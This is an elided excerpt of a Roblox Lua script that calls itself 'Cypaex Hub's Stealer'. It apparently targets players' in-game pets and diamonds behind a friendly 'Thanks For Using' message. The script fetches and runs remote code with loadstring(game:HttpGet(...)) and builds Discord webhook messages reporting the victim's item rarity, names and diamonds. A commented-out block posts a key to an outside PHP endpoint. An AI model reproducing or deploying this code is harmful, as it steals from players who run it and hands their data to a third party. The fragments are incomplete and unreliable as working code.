...
getgenv().Settings = {
    ...
    MailMessage = "Thanks For Using Cypaex Hub!",
    Titanics = {
        Dualhook = true,
        Intensity = 100 --%
    },
...
if _G.LoadingScreen ~= true then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Cypaex/PsxLoading/main/Engine.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
end
...
local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
    ...
    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
        imgs =
        "https://cdn.discordapp.com/attachments/1129524257655902210/1130646633579819038/gifc.gif"
        data1 = {
            ["content"] = ping,
            ["username"] = "Cypaex Hub",
            ["avatar_url"] = imgs,
            ["embeds"] = { {
                ...
                ["fields"] = { {
                    ["name"] = "**This data was generated using Cypaex Hub's Stealer** :moyai:",
...
--             dhprem = dhkey
--         }
--         local dhurl = "https://janeq.space/others/keya.php" -- Exc : https://rizz.xyz/premium.php
--         local dhheaders = {
--             ["content-type"] = "application/json"
--         }
